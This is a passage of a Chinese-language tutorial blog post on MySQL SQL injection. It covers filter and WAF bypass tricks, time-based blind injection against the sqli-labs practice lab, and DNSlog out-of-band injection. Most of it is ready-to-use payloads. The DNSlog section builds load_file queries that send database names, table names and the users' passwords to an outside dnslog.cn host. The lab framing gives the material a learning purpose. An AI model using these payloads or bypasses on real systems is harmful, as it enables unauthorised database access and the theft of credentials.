keyword">database</span>（）第一个字符ascii码是否为<span class="token number">109</span>，若是则加载延时<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="3-引号绕过（使用十六进制）："><a href="#3-引号绕过（使用十六进制）：" class="headerlink" title="3.引号绕过（使用十六进制）："></a>3.引号绕过（使用十六进制）：</h5><p>会使用到引号的地方一般是在最后的<code>where</code>子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> column_name  <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">"users"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个时候如果引号被过滤了，那么上面的<code>where</code>子句就无法使用了。那么遇到这样的问题就要使用<strong>十六进制</strong>来处理这个问题了。<br><code>　　users</code>的十六进制的字符串是<code>7573657273</code>。那么最后的sql语句就变为了：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> column_name  <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token number">0x7573657273</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="4-逗号绕过（使用from或者offset）"><a href="#4-逗号绕过（使用from或者offset）" class="headerlink" title="4.逗号绕过（使用from或者offset）"></a>4.逗号绕过（使用from或者offset）</h5><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用<code>from to</code>的方式来解决：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>使用<span class="token keyword">join</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span>     <span class="token comment">#等价于</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b使用<span class="token operator">like</span><span class="token keyword">select</span> ascii<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">80</span>   <span class="token comment">#等价于</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">'r%'</span>对于<span class="token keyword">limit</span> 可以使用<span class="token keyword">offset</span> 来绕过<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> news <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment"># 等价于下面这条SQL语句</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> news <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="5-比较符号（-lt-gt-）绕过（过滤了-lt-gt-：sqlmap盲注经常使用-lt-gt-，使用between的脚本）"><a href="#5-比较符号（-lt-gt-）绕过（过滤了-lt-gt-：sqlmap盲注经常使用-lt-gt-，使用between的脚本）" class="headerlink" title="5.比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）"></a>5.比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）</h5><p>使用greatest(),least():前者返回最大值，后者返回最小值</p><p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到<code>greatest</code>来进行绕过了。<br>最常见的一个盲注的sql语句：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">64</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用<code>greatest</code>来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。<br>那么上面的这条sql语句可以使用<code>greatest</code>变为如下的子句:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> greatest<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">64</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>between a and b：</p><p>between 1 and 1; 等价于 =1</p><h5 id="6-or-and-xor-not-绕过"><a href="#6-or-and-xor-not-绕过" class="headerlink" title="6.or and xor not 绕过"></a>6.or and xor not 绕过</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">and</span><span class="token operator">=</span><span class="token operator">&amp;&amp;</span>  <span class="token operator">or</span><span class="token operator">=</span><span class="token operator">||</span><span class="token punctuation">.</span> <span class="token operator">xor</span><span class="token operator">=</span><span class="token operator">|</span> <span class="token operator">not</span><span class="token operator">=</span><span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="7-绕过注释符号（-，–（后面跟一个空格））-过滤"><a href="#7-绕过注释符号（-，–（后面跟一个空格））-过滤" class="headerlink" title="7.绕过注释符号（#，–（后面跟一个空格）） 过滤"></a>7.绕过注释符号（#，–（后面跟一个空格）） 过滤</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,2,3||'</span><span class="token number">1</span>最后的<span class="token operator">or</span> <span class="token string">'1闭合查询语句的最后的单引号，或者：id=1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>'<span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="8-绕过"><a href="#8-绕过" class="headerlink" title="8.=绕过"></a>8.=绕过</h5><p>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</p><h5 id="9-绕过-union，select，where"><a href="#9-绕过-union，select，where" class="headerlink" title="9.绕过 union，select，where"></a>9.绕过 union，select，where</h5><p>1.常用注释符绕过</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&#x2F;&#x2F;，-- , &#x2F;**&#x2F;, #, --+, -- -, ;,%00,--a用法U&#x2F;**&#x2F; NION &#x2F;**&#x2F; SE&#x2F;**&#x2F; LECT &#x2F;**&#x2F;user，pwd from user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>2.大小写绕过</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token keyword">UnIoN</span><span class="token comment">/**/</span><span class="token keyword">SeLeCT</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.内联注释绕过</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token comment">/*!UnIoN*/</span> <span class="token keyword">SeLeCT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token comment">/*!table_name*/</span><span class="token punctuation">)</span> <span class="token keyword">FrOM</span> <span class="token comment">/*!information_schema*/</span><span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token comment">/*!WHERE */</span><span class="token comment">/*!TaBlE_ScHeMa*/</span> <span class="token operator">like</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>双关键字绕过（若删除掉第一个匹配的union就能绕过）</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span> 'UnionONSElectECT <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="10-通用绕过（编码-）"><a href="#10-通用绕过（编码-）" class="headerlink" title="10. 通用绕过（编码 ）"></a>10. 通用绕过（编码 ）</h5><p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>即<span class="token operator">%</span><span class="token number">6</span>f<span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">31</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">31</span>，而Test也可以为<span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">)</span>。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="11-等价函数绕过"><a href="#11-等价函数绕过" class="headerlink" title="11.等价函数绕过"></a>11.等价函数绕过</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">hex<span class="token punctuation">(</span><span class="token punctuation">)</span>、bin<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">=</span><span class="token operator">></span> ascii<span class="token punctuation">(</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">=</span><span class="token operator">></span>benchmark<span class="token punctuation">(</span><span class="token punctuation">)</span>concat_ws<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">=</span><span class="token operator">></span>group_concat<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token punctuation">)</span>、substr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">=</span><span class="token operator">></span> substring<span class="token punctuation">(</span><span class="token punctuation">)</span>@<span class="token variable">@user</span> <span class="token operator">=</span><span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>@<span class="token variable">@datadir</span> <span class="token operator">=</span><span class="token operator">=</span><span class="token operator">></span> datadir<span class="token punctuation">(</span><span class="token punctuation">)</span>举例：substring<span class="token punctuation">(</span><span class="token punctuation">)</span>和substr<span class="token punctuation">(</span><span class="token punctuation">)</span>无法使用时：?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">+</span><span class="token operator">and</span><span class="token operator">+</span>ascii<span class="token punctuation">(</span>lower<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span>pwd<span class="token operator">+</span><span class="token keyword">from</span><span class="token operator">+</span>users<span class="token operator">+</span><span class="token keyword">limit</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">74</span>　或者：substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x70</span>strcmp<span class="token punctuation">(</span><span class="token keyword">left</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span>strcmp<span class="token punctuation">(</span><span class="token keyword">left</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span>strcmp<span class="token punctuation">(</span><span class="token keyword">left</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="12-宽字节注入："><a href="#12-宽字节注入：" class="headerlink" title="12. 宽字节注入："></a>12. 宽字节注入：</h5><p>过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为 &#39; 。</p><p>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：</p><p>（1）%df 吃掉 \ 具体的方法是 urlencode(‘) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>df<span class="token operator">%</span><span class="token number">27</span>union <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）将 &#39; 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。</p><p>一般产生宽字节注入的PHP函数</p><p>1.replace（）：过滤 ‘ \ ，将 ‘ 转化为 &#39; ，将 \  转为 \，将 “ 转为 &quot; 。用思路一。</p><p>2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：’ , “ , \ 。用思路一</p><p>（防御此漏洞，要将 mysql_query 设置为 binary 的方式）</p><p>3.mysql_real_escape_string()：转义下列字符：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">\x00     \n     \r     \     '     "     \x1a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="13-PCRE绕过"><a href="#13-PCRE绕过" class="headerlink" title="13. PCRE绕过"></a>13. PCRE绕过</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">union</span><span class="token comment">/*'+'a'*1000001+'*/</span><span class="token keyword">select</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="1-2延时注入学习"><a href="#1-2延时注入学习" class="headerlink" title="1.2延时注入学习"></a>1.2延时注入学习</h2><h3 id="1-2-1-环境搭建"><a href="#1-2-1-环境搭建" class="headerlink" title="1.2.1 环境搭建"></a>1.2.1 环境搭建</h3><p>phpstudy：<a href="https://www.xp.cn/">https://www.xp.cn/</a></p><p>sql注入靶场：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><p>下载完文件后，将sql注入靶场押解在phpstudy/WWW/ 路径下，修改sql-connection下的sql配置文件，并运行phpstudy，访问相应目录即可</p><h3 id="1-2-2-ACSii表"><a href="#1-2-2-ACSii表" class="headerlink" title="1.2.2 ACSii表"></a>1.2.2 ACSii表</h3><h3 id="1-2-3-注入相关知识"><a href="#1-2-3-注入相关知识" class="headerlink" title="1.2.3 注入相关知识"></a>1.2.3 注入相关知识</h3><p>本此注入为第三关，SQL注入攻击采用的基本都为盲注以及其他注入，这里以mysql盲注为例；</p><p>延时注入：针对页面无变化，无法用布尔真假判断，无法报错的情况下注入 ，需要以下函数</p><p>Sleep()  延时</p><p>if（条件，true，false） 判断语句</p><p>mid（str，1，1） 指定字符串截取，截取字符开始长度，结束长度</p><p>ascii      转化为ascii 编码</p><h3 id="1-2-4-猜库名"><a href="#1-2-4-猜库名" class="headerlink" title="1.2.4 猜库名"></a>1.2.4 猜库名</h3><p>猜测database() 当前数据库名字，构造如下语句</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">'and if(ascii(mid(database(),1,1))=1,sleep(5),1)--+'</span>mid函数截取<span class="token keyword">database</span>（）当前库库名第一个字符，判断第一个字符是否为<span class="token number">1</span>，<span class="token number">1</span>为ascii字符，如果第一个字符<span class="token operator">=</span>其中的一个ascii字符，那么就延时<span class="token number">5</span>秒，如果不等于则延时<span class="token number">1</span>秒<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用burp 爆破模块</p><p>模块一为第几个字符</p><p>模块二为对应的ascii码 1-127</p><p>爆破结果如图，对照ACSii表 得出databaes（）为security</p><h3 id="1-2-5-猜表名"><a href="#1-2-5-猜表名" class="headerlink" title="1.2.5 猜表名"></a>1.2.5 猜表名</h3><p>LIMIT 子句可以被用于强制 SELECT 语句返回指定的记录数。LIMIT 接受一个或两个数字参数。参数必须是一个整数常量。如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目。</p><p>下面开始猜测表名</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name frominformation_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">113</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">--+</span>查询第一个数据库表名的第一个字符是否大于<span class="token number">113</span>，如果大于停顿<span class="token number">10</span>秒<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="1-2-6-猜列名"><a href="#1-2-6-猜列名" class="headerlink" title="1.2.6 猜列名"></a>1.2.6 猜列名</h3><p>只需要将 select 语句里的</p><p>table_name 改 为 column_name 以 及 information_schemation.tables 改 为</p><p>information_schemation.columns</p><p>就可以了。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/Less-8/index.php?id=1'and if(ascii(mid((select column_name from information_</span><span class="token keyword">schema</span><span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">113</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="1-2-7-猜字段"><a href="#1-2-7-猜字段" class="headerlink" title="1.2.7 猜字段"></a>1.2.7 猜字段</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"> <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> username <span class="token keyword">from</span> security<span class="token punctuation">.</span>users <span class="token keyword">order</span> <span class="token keyword">by</span> id <span class="token keyword">limit</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">117</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="1-3-DNSlog-盲注"><a href="#1-3-DNSlog-盲注" class="headerlink" title="1.3 DNSlog 盲注"></a>1.3 DNSlog 盲注</h2><h3 id="1-3-1-基础知识"><a href="#1-3-1-基础知识" class="headerlink" title="1.3.1 基础知识"></a>1.3.1 基础知识</h3><p>DNS(Domain Name System，域名系统)，因特网上作为域名和 IP 地址相互映射的</p><p>一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器</p><p>直接读取的 IP 数串。通过主机名，最终得到该主机名对应的 IP 地址的过程叫做</p><p>域名解析(或主机名解析)。DNS 协议运行在 UDP 协议之上，使用端口号 53。</p><p>Dnslog 就是存储在 DNS Server 上的域名信息，它记录着用户对域名 <a href="http://www.aaaa.com、/">www.aaaa.com、</a></p><p>bbbb.com.等的访问信息</p><h3 id="1-3-2-Dnslog-盲注原因"><a href="#1-3-2-Dnslog-盲注原因" class="headerlink" title="1.3.2 Dnslog 盲注原因"></a>1.3.2 Dnslog 盲注原因</h3><p>对于 SQL 盲注，我们可以通过布尔或者时间盲注获取内容，但是整个过程效率</p><p>低，需要发送很多的请求进行判断，如果存在 waf 等安全防护设备，很容易被封</p><p>掉 ip，Dnslog 盲注可以减少发送的请求，直接回显数据实现注入 使用 DnsLog 盲</p><p>注</p><h3 id="1-3-3-原理介绍"><a href="#1-3-3-原理介绍" class="headerlink" title="1.3.3 原理介绍"></a>1.3.3 原理介绍</h3><p>1.攻击者首先提交注入语句 select load_file(concat(‘\\&#39;,’攻击语句’,xxx.dnslog.cn\adb))</p><p>2.在数据库中攻击语句被执行，concat函数将执行结果与XXX.dnslog.cn\abc拼接，构成一个新的域名，而mysql中的select load_file()可以发起请求，那么这条带有数据库查询结果的域名将被提交到DNS服务器进行解析</p><p>3.此时，如果我们可以查看DNS服务器上的Dnslog 就可以得到SQL注入结果</p><p>注：仅限于windos环境，对于表段，由于load_file()一次只能传输一条数据，所以查询的时候需要使用，limit 来一个一个解析</p><h3 id="1-3-4-实操"><a href="#1-3-4-实操" class="headerlink" title="1.3.4 实操"></a>1.3.4 实操</h3><p>1.今天dnslog，获取子域名</p><p>2.打开sqli-labs盲注关卡（less-9）</p><p>如果不使用dnslog，网站又没有waf拦截ip，使用sqlmap，部分waf可以使用tamper参数编码绕过，但花费时间较多;</p><p>3.Dnslog 盲注</p><p>使用select load_file(concat(‘\\\&#39;,攻击语句’，xxx.dnslog\abc))构造相关语句</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">查询数据库<span class="token operator">and</span> load_file<span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token string">'\\\\'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.w40iw8.dnslog.cn\\abc'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span>查表查 表 <span class="token operator">and</span> load_file<span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token string">'\\\\'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.w40iw8.dnslog.cn\\abc'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span>查字段查 字 段 <span class="token operator">and</span> load_file<span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token string">'\\\\'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.w40iw8.dnslog.cn\\abc'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span>用点分隔，同时输出多个查询结果<span class="token operator">and</span> load_file<span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token string">'\\\\'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span> <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.wbrd5d.dnslog.cn\\abc'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span>查数据 <span class="token operator">and</span> load_file<span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token string">'\\\\'</span><span class="token punctuation">,</span><span class="token punctuation">(</span> <span class="token keyword">select</span> password <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token punctuation">(</span> <span class="token keyword">select</span> password <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.wbrd5d.dnslog.cn\\abc'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" 